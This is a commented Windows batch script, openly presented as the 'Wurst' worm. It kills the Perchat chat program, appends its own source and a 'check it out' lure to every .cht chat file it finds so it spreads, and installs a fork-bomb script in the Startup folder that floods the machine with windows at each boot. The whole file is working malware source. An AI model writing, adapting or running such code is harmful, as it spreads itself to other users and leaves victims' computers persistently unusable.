REM "Wurst" Perchat worm
@echo off
REM Sets the command prompt title to Wurst.
title Wurst

REM Kill Perchat
REM Tskill is silent compared to Taskkill
tskill Perchat.exe
tskill Perchat_Nova.exe

REM Recursively finds chat files starting from the directory where Wurst was executed.
for /r %%i in (*.cht) do (
	REM Adds new line to a chat file
	echo: >> %%i
	REM Message telling users to check it out.
	echo this is wurst, a cool program -Wurst %date% >> %%i
	echo check it out! -Wurst %date% >> %%i
	REM Source code for the worm, %0 refers to the batch file
	type %0 >> %%i
	echo: >> %%i
	REM Sign off with Wurst
	echo -Wurst %date% >> %%i
	echo: >> %%i
)

REM Writes a forkbomb\resource exhauster called Mad into the Startup folder. What happens is that Mad runs every time the computer boots up.
echo @echo off > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mad.bat"
echo :x >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mad.bat"
echo start cmd >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mad.bat"
echo start explorer >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mad.bat"
echo start calc >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mad.bat"
echo start winver >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mad.bat"
echo start mspaint >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mad.bat"
echo goto :x >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mad.bat"

REM ASCII Art message
REM Sets the encoding to UTF-8 because if you don't, the ASCII art would look malformed. Also, >nul hides output
chcp 65001>nul
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⠷⠶⠖⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣶⣄⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣤⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠻⠿⢿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣷⣶⣤⣾⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⢀⣠⡀⠲⢿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⣴⣿⣿⣿⣶⣤⣄⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠠⢤⣴⡆⠈⠙⠛⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo Wurst, written by House MD.
echo:
pause
